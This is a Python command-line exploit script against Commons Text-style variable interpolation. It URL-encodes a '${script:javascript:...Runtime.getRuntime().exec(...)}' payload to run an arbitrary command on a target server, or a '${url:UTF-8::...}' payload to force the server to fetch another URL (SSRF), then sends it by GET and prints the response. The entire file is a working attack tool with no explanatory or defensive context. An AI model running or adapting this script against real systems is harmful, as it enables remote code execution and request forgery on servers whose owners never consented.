#! /usr/bin/python3

import argparse
import urllib.parse
import requests

# Set up argument parser
parser = argparse.ArgumentParser(description='Combine command and URL.')

parser.add_argument('-c', '--command', type=str, required=False, help='Command to be executed')
parser.add_argument('-u', '--url', type=str, required=True, help='Base URL (if RCE mode selected, include ?variable=)')
parser.add_argument('-s', '--ssrf', type=str, required=False, help='URL to request in ssrf mode')
parser.add_argument('-m', '--mode', type=str, required=True, choices=['ssrf', 'rce'], help='Mode to be used')


args = parser.parse_args()

#Check Mode
if args.mode == 'rce':
    if not args.command:
        print("Error: command must be provided for rce mode")
        exit(1)

    # Payload creation & encoding
    js_command = f"${{script:javascript:java.lang.Runtime.getRuntime().exec('{args.command}')}}"
    js_command_encoded = urllib.parse.quote(js_command)

    # Combine command and URL
    full_url = f"{args.url}{js_command_encoded}"

elif args.mode == 'ssrf':
    if not args.ssrf:
        print("Error: ssrf url must be provided for ssrf mode")
        exit(1)

    # Payload creation & encoding
    ssrf = f"${{url:UTF-8::{args.ssrf}}}"
    ssrf_encoded = urllib.parse.quote(ssrf)

    # Combine command and URL
    full_url = f"{args.url}{ssrf_encoded}"

# Make a GET Request
response = requests.get(full_url)

# Print response
print("Response status code:", response.status_code)
print("Response body:", response.text)